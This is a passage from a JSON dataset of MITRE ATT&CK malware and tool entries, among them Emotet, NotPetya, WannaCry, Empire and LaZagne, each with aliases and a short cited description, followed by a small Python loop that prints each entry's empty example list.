    "description": "[DarkComet](https://attack.mitre.org/software/S0334) is a Windows remote administration tool and backdoor.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018)",
    "example_uses": []
  },
  "malware--f25aab1a-0cef-4910-a85d-bb38b32ea41a": {
    "id": "S0354",
    "name": "Denis",
    "examples": [],
    "similar_words": [
      "Denis"
    ],
    "description": "[Denis](https://attack.mitre.org/software/S0354) is a Windows backdoor and Trojan.(Citation: Cybereason Oceanlotus May 2017)",
    "example_uses": []
  },
  "malware--d6b3fcd0-1c86-4350-96f0-965ed02fcc51": {
    "id": "S0377",
    "name": "Ebury",
    "examples": [],
    "similar_words": [
      "Ebury"
    ],
    "description": "[Ebury](https://attack.mitre.org/software/S0377) is an SSH backdoor targeting Linux operating systems. Attackers require root-level access, which allows them to replace SSH binaries (ssh, sshd, ssh-add, etc) or modify a shared library used by OpenSSH (libkeyutils).(Citation: ESET Ebury Feb 2014)(Citation: BleepingComputer Ebury March 2017)",
    "example_uses": []
  },
  "malware--32066e94-3112-48ca-b9eb-ba2b59d2f023": {
    "id": "S0367",
    "name": "Emotet",
    "examples": [],
    "similar_words": [
      "Emotet",
      "Geodo"
    ],
    "description": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and IcedID. Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)",
    "example_uses": []
  },
  "malware--051eaca1-958f-4091-9e5f-a9acd8f820b5": {
    "id": "S0343",
    "name": "Exaramel",
    "examples": [],
    "similar_words": [
      "Exaramel"
    ],
    "description": "[Exaramel](https://attack.mitre.org/software/S0343) is multi-platform backdoor for Linux and Windows systems.(Citation: ESET TeleBots Oct 2018)",
    "example_uses": []
  },
  "malware--a2282af0-f9dd-4373-9b92-eaf9e11e0c71": {
    "id": "S0355",
    "name": "Final1stspy",
    "examples": [],
    "similar_words": [
      "Final1stspy"
    ],
    "description": "[Final1stspy](https://attack.mitre.org/software/S0355) is a dropper family that has been used to deliver [DOGCALL](https://attack.mitre.org/software/S0213).(Citation: Unit 42 Nokki Oct 2018)",
    "example_uses": []
  },
  "malware--308b3d68-a084-4dfb-885a-3125e1a9c1e8": {
    "id": "S0342",
    "name": "GreyEnergy",
    "examples": [],
    "similar_words": [
      "GreyEnergy"
    ],
    "description": "[GreyEnergy](https://attack.mitre.org/software/S0342) is a backdoor written in C and compiled in Visual Studio. [GreyEnergy](https://attack.mitre.org/software/S0342) shares similarities with the [BlackEnergy](https://attack.mitre.org/software/S0089) malware and is thought to be the successor of it.(Citation: ESET GreyEnergy Oct 2018)",
    "example_uses": []
  },
  "malware--454fe82d-6fd2-4ac6-91ab-28a33fe01369": {
    "id": "S0376",
    "name": "HOPLIGHT",
    "examples": [],
    "similar_words": [
      "HOPLIGHT"
    ],
    "description": "[HOPLIGHT](https://attack.mitre.org/software/S0376) is a backdoor Trojan that has reportedly been used by the North Korean government.(Citation: US-CERT HOPLIGHT Apr 2019)",
    "example_uses": []
  },
  "malware--86b92f6c-9c05-4c51-b361-4c7bb13e21a1": {
    "id": "S0356",
    "name": "KONNI",
    "examples": [],
    "similar_words": [
      "KONNI"
    ],
    "description": "[KONNI](https://attack.mitre.org/software/S0356) is a Windows remote administration too that has been seen in use since 2014 and evolved in its capabilities through at least 2017. [KONNI](https://attack.mitre.org/software/S0356) has been linked to several campaigns involving North Korean themes.(Citation: Talos Konni May 2017) [KONNI](https://attack.mitre.org/software/S0356) has significant code overlap with the [NOKKI](https://attack.mitre.org/software/S0353) malware family. There is some evidence potentially linking [KONNI](https://attack.mitre.org/software/S0356) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)",
    "example_uses": []
  },
  "malware--0efefea5-78da-4022-92bc-d726139e8883": {
    "id": "S0362",
    "name": "Linux Rabbit",
    "examples": [],
    "similar_words": [
      "Linux Rabbit"
    ],
    "description": "[Linux Rabbit](https://attack.mitre.org/software/S0362) is malware that targeted Linux servers and IoT devices in a campaign lasting from August to October 2018. It shares code with another strain of malware known as Rabbot. The goal of the campaign was to install cryptocurrency miners onto the targeted servers and devices.(Citation: Anomali Linux Rabbit 2018)\n",
    "example_uses": []
  },
  "malware--5af7a825-2d9f-400d-931a-e00eb9e27f48": {
    "id": "S0372",
    "name": "LockerGoga ",
    "examples": [],
    "similar_words": [
      "LockerGoga "
    ],
    "description": "[LockerGoga ](https://attack.mitre.org/software/S0372) is ransomware that has been tied to various attacks on European companies. It was first reported upon in January 2019.(Citation: Unit42 LockerGoga 2019)(Citation: CarbonBlack LockerGoga 2019)",
    "example_uses": []
  },
  "malware--8c050cea-86e1-4b63-bf21-7af4fa483349": {
    "id": "S0339",
    "name": "Micropsia",
    "examples": [],
    "similar_words": [
      "Micropsia"
    ],
    "description": "[Micropsia](https://attack.mitre.org/software/S0339) is a remote access tool written in Delphi.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018)",
    "example_uses": []
  },
  "malware--071d5d65-83ec-4a55-acfa-be7d5f28ba9a": {
    "id": "S0353",
    "name": "NOKKI",
    "examples": [],
    "similar_words": [
      "NOKKI"
    ],
    "description": "[NOKKI](https://attack.mitre.org/software/S0353) is a modular remote access tool. The earliest observed attack using [NOKKI](https://attack.mitre.org/software/S0353) was in January 2018. [NOKKI](https://attack.mitre.org/software/S0353) has significant code overlap with the [KONNI](https://attack.mitre.org/software/S0356) malware family. There is some evidence potentially linking [NOKKI](https://attack.mitre.org/software/S0353) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)",
    "example_uses": []
  },
  "malware--b4d80f8b-d2b9-4448-8844-4bef777ed676": {
    "id": "S0336",
    "name": "NanoCore",
    "examples": [],
    "similar_words": [
      "NanoCore"
    ],
    "description": "[NanoCore](https://attack.mitre.org/software/S0336) is a modular remote access tool developed in .NET that can be used to spy on victims and steal information. It has been used by threat actors since 2013.(Citation: DigiTrust NanoCore Jan 2017)(Citation: Cofense NanoCore Mar 2018)(Citation: PaloAlto NanoCore Feb 2016)(Citation: Unit 42 Gorgon Group Aug 2018)",
    "example_uses": []
  },
  "malware--5719af9d-6b16-46f9-9b28-fb019541ddbb": {
    "id": "S0368",
    "name": "NotPetya",
    "examples": [],
    "similar_words": [
      "NotPetya",
      "GoldenEye",
      "Petrwrap",
      "Nyetya"
    ],
    "description": "[NotPetya](https://attack.mitre.org/software/S0368) is malware that was first seen in a worldwide attack starting on June 27, 2017. The main purpose of the malware appeared to be to effectively destroy data and disk structures on compromised systems. Though [NotPetya](https://attack.mitre.org/software/S0368) presents itself as a form of ransomware, it appears likely that the attackers never intended to make the encrypted data recoverable. As such, [NotPetya](https://attack.mitre.org/software/S0368) may be more appropriately thought of as a form of wiper malware. [NotPetya](https://attack.mitre.org/software/S0368) contains worm-like features to spread itself across a computer network using the SMBv1 exploits EternalBlue and EternalRomance.(Citation: Talos Nyetya June 2017)(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)",
    "example_uses": []
  },
  "malware--b00f90b6-c75c-4bfd-b813-ca9e6c9ebf29": {
    "id": "S0352",
    "name": "OSX_OCEANLOTUS.D",
    "examples": [],
    "similar_words": [
      "OSX_OCEANLOTUS.D"
    ],
    "description": "[OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) is a MacOS backdoor that has been used by [APT32](https://attack.mitre.org/groups/G0050).(Citation: TrendMicro MacOS April 2018)",
    "example_uses": []
  },
  "malware--288fa242-e894-4c7e-ac86-856deedf5cea": {
    "id": "S0346",
    "name": "OceanSalt",
    "examples": [],
    "similar_words": [
      "OceanSalt"
    ],
    "description": "[OceanSalt](https://attack.mitre.org/software/S0346) is a Trojan that was used in a campaign targeting victims in South Korea, United States, and Canada. [OceanSalt](https://attack.mitre.org/software/S0346) shares code similarity with [SpyNote RAT](https://attack.mitre.org/software/S0305), which has been linked to [APT1](https://attack.mitre.org/groups/G0006).(Citation: McAfee Oceansalt Oct 2018)",
    "example_uses": []
  },
  "malware--e2031fd5-02c2-43d4-85e2-b64f474530c2": {
    "id": "S0340",
    "name": "Octopus",
    "examples": [],
    "similar_words": [
      "Octopus"
    ],
    "description": "[Octopus](https://attack.mitre.org/software/S0340) is a Windows Trojan.(Citation: Securelist Octopus Oct 2018)",
    "example_uses": []
  },
  "malware--3249e92a-870b-426d-8790-ba311c1abfb4": {
    "id": "S0365",
    "name": "Olympic Destroyer",
    "examples": [],
    "similar_words": [
      "Olympic Destroyer"
    ],
    "description": "[Olympic Destroyer](https://attack.mitre.org/software/S0365) is malware that was first seen infecting computer systems at the 2018 Winter Olympics, held in Pyeongchang, South Korea. The main purpose of the malware appears to be to cause destructive impact to the affected systems. The malware leverages various native Windows utilities and API calls to carry out its destructive tasks. The malware has worm-like features to spread itself across a computer network in order to maximize its destructive impact.(Citation: Talos Olympic Destroyer 2018) ",
    "example_uses": []
  },
  "malware--e85cae1a-bce3-4ac4-b36b-b00acac0567b": {
    "id": "S0371",
    "name": "POWERTON",
    "examples": [],
    "similar_words": [
      "POWERTON"
    ],
    "description": "[POWERTON](https://attack.mitre.org/software/S0371) is a custom PowerShell backdoor first observed in 2018. It has typically been deployed as a late-stage backdoor by [APT33](https://attack.mitre.org/groups/G0064). At least two variants of the backdoor have been identified, with the later version containing improved functionality.(Citation: FireEye APT33 Guardrail)",
    "example_uses": []
  },
  "malware--ecc2f65a-b452-4eaf-9689-7e181f17f7a5": {
    "id": "S0375",
    "name": "Remexi",
    "examples": [],
    "similar_words": [
      "Remexi"
    ],
    "description": "[Remexi](https://attack.mitre.org/software/S0375) is a Windows-based Trojan that was developed in the C programming language.(Citation: Securelist Remexi Jan 2019)",
    "example_uses": []
  },
  "malware--4d56e6e9-1a6d-46e3-896c-dfdf3cc96e62": {
    "id": "S0370",
    "name": "SamSam",
    "examples": [],
    "similar_words": [
      "SamSam",
      "Samas"
    ],
    "description": "[SamSam](https://attack.mitre.org/software/S0370) is ransomware that appeared in early 2016. Unlike some ransomware, its variants have required operators to manually interact with the malware to execute some of its core components.(Citation: US-CERT SamSam 2018)(Citation: Talos SamSam Jan 2018)(Citation: Sophos SamSam Apr 2018)(Citation: Symantec SamSam Oct 2018)",
    "example_uses": []
  },
  "malware--b45747dc-87ca-4597-a245-7e16a61bc491": {
    "id": "S0345",
    "name": "Seasalt",
    "examples": [],
    "similar_words": [
      "Seasalt"
    ],
    "description": "[Seasalt](https://attack.mitre.org/software/S0345) is malware that has been linked to [APT1](https://attack.mitre.org/groups/G0006)'s 2010 operations. It shares some code similarities with [OceanSalt](https://attack.mitre.org/software/S0346).(Citation: Mandiant APT1 Appendix)(Citation: McAfee Oceansalt Oct 2018)",
    "example_uses": []
  },
  "malware--a5575606-9b85-4e3d-9cd2-40ef30e3672d": {
    "id": "S0374",
    "name": "SpeakUp",
    "examples": [],
    "similar_words": [
      "SpeakUp"
    ],
    "description": "[SpeakUp](https://attack.mitre.org/software/S0374) is a Trojan backdoor that targets both Linux and OSX devices. It was first observed in January 2019. (Citation: CheckPoint SpeakUp Feb 2019)",
    "example_uses": []
  },
  "malware--518bb5f1-91f4-4ff2-b09d-5a94e1ebe95f": {
    "id": "S0333",
    "name": "UBoatRAT",
    "examples": [],
    "similar_words": [
      "UBoatRAT"
    ],
    "description": "[UBoatRAT](https://attack.mitre.org/software/S0333) is a remote access tool that was identified in May 2017.(Citation: PaloAlto UBoatRAT Nov 2017)",
    "example_uses": []
  },
  "malware--75ecdbf1-c2bb-4afc-a3f9-c8da4de8c661": {
    "id": "S0366",
    "name": "WannaCry",
    "examples": [],
    "similar_words": [
      "WannaCry",
      "WanaCry",
      "WanaCrypt",
      "WanaCrypt0r",
      "WCry"
    ],
    "description": "[WannaCry](https://attack.mitre.org/software/S0366) is ransomware that was first seen in a global attack during May 2017, which affected more than 150 countries. It contains worm-like features to spread itself across a computer network using the SMBv1 exploit EternalBlue.(Citation: LogRhythm WannaCry)(Citation: US-CERT WannaCry 2017)(Citation: Washington Post WannaCry 2017)(Citation: FireEye WannaCry 2017)",
    "example_uses": []
  },
  "malware--6a92d80f-cc65-45f6-aa66-3cdea6786b3c": {
    "id": "S0341",
    "name": "Xbash",
    "examples": [],
    "similar_words": [
      "Xbash"
    ],
    "description": "[Xbash](https://attack.mitre.org/software/S0341) is a malware family that has targeted Linux and Microsoft Windows servers. The malware has been tied to the Iron Group, a threat actor group known for previous ransomware attacks. [Xbash](https://attack.mitre.org/software/S0341) was developed in Python and then converted into a self-contained Linux ELF executable by using PyInstaller.(Citation: Unit42 Xbash Sept 2018)",
    "example_uses": []
  },
  "malware--198db886-47af-4f4c-bff5-11b891f85946": {
    "id": "S0330",
    "name": "Zeus Panda",
    "examples": [],
    "similar_words": [
      "Zeus Panda"
    ],
    "description": "[Zeus Panda](https://attack.mitre.org/software/S0330) is a Trojan designed to steal banking information and other sensitive credentials for exfiltration. [Zeus Panda](https://attack.mitre.org/software/S0330)’s original source code was leaked in 2011, allowing threat actors to use its source code as a basis for new malware variants. It is mainly used to target Windows operating systems ranging from Windows XP through Windows 10.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017)",
    "example_uses": []
  },
  "malware--54e8672d-5338-4ad1-954a-a7c986bee530": {
    "id": "S0350",
    "name": "zwShell",
    "examples": [],
    "similar_words": [
      "zwShell"
    ],
    "description": "[zwShell](https://attack.mitre.org/software/S0350) is a remote access tool (RAT) written in Delphi that has been used by [Night Dragon](https://attack.mitre.org/groups/G0014).(Citation: McAfee Night Dragon)",
    "example_uses": []
  },
  "tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3": {
    "id": "S0363",
    "name": "Empire",
    "examples": [],
    "similar_words": [
      "Empire",
      "EmPyre",
      "PowerShell Empire"
    ],
    "description": "[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n",
    "example_uses": []
  },
  "tool--ca656c25-44f1-471b-9d9f-e2a3bbb84973": {
    "id": "S0361",
    "name": "Expand",
    "examples": [],
    "similar_words": [
      "Expand"
    ],
    "description": "[Expand](https://attack.mitre.org/software/S0361) is a Windows utility used to expand one or more compressed CAB files.(Citation: Microsoft Expand Utility) It has been used by [BBSRAT](https://attack.mitre.org/software/S0127) to decompress a CAB file into executable content.(Citation: Palo Alto Networks BBSRAT)",
    "example_uses": []
  },
  "tool--26c87906-d750-42c5-946c-d4162c73fc7b": {
    "id": "S0357",
    "name": "Impacket",
    "examples": [],
    "similar_words": [
      "Impacket"
    ],
    "description": "[Impacket](https://attack.mitre.org/software/S0357) is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols. [Impacket](https://attack.mitre.org/software/S0357) contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.(Citation: Impacket Tools)",
    "example_uses": []
  },
  "tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b": {
    "id": "S0349",
    "name": "LaZagne",
    "examples": [],
    "similar_words": [
      "LaZagne"
    ],
    "description": "[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)",
    "example_uses": []
  },
  "tool--981acc4c-2ede-4b56-be6e-fa1a75f37acf": {
    "id": "S0359",
    "name": "Nltest",
    "examples": [],
    "similar_words": [
      "Nltest"
    ],
    "description": "[Nltest](https://attack.mitre.org/software/S0359) is a Windows command-line utility used to list domain controllers and enumerate domain trusts.(Citation: Nltest Manual)",
    "example_uses": []
  },
  "tool--4b57c098-f043-4da2-83ef-7588a6d426bc": {
    "id": "S0378",
    "name": "PoshC2",
    "examples": [],
    "similar_words": [
      "PoshC2"
    ],
    "description": "[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1086). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)",
    "example_uses": []
  },
  "tool--3ffbdc1f-d2bf-41ab-91a2-c7b857e98079": {
    "id": "S0364",
    "name": "RawDisk",
    "examples": [],
    "similar_words": [
      "RawDisk"
    ],
    "description": "[RawDisk](https://attack.mitre.org/software/S0364) is a legitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer's hard drive. In some cases, the tool can enact these raw disk modifications from user-mode processes, circumventing Windows operating system security features.(Citation: EldoS RawDisk ITpro)(Citation: Novetta Blockbuster Destructive Malware)",
    "example_uses": []
  },
  "tool--7cd0bc75-055b-4098-a00e-83dc8beaff14": {
    "id": "S0332",
    "name": "Remcos",
    "examples": [],
    "similar_words": [
      "Remcos"
    ],
    "description": "[Remcos](https://attack.mitre.org/software/S0332) is a closed-source tool that is marketed as a remote control and surveillance software by a company called Breaking Security. [Remcos](https://attack.mitre.org/software/S0332) has been observed being used in malware campaigns.(Citation: Riskiq Remcos Jan 2018)(Citation: Talos Remcos Aug 2018)",
    "example_uses": []
  },
  "tool--90ac9266-68ce-46f2-b24f-5eb3b2a8ea38": {
    "id": "S0358",
    "name": "Ruler",
    "examples": [],
    "similar_words": [
      "Ruler"
    ],
    "description": "[Ruler](https://attack.mitre.org/software/S0358) is a tool to abuse Microsoft Exchange services. It is publicly available on GitHub and the tool is executed via the command line. The creators of [Ruler](https://attack.mitre.org/software/S0358) have also released a defensive tool, NotRuler, to detect its usage.(Citation: SensePost Ruler GitHub)(Citation: SensePost NotRuler)",
    "example_uses": []
  }
}

for k in d.items():
    examples = k[1]['example_uses']
    print(examples)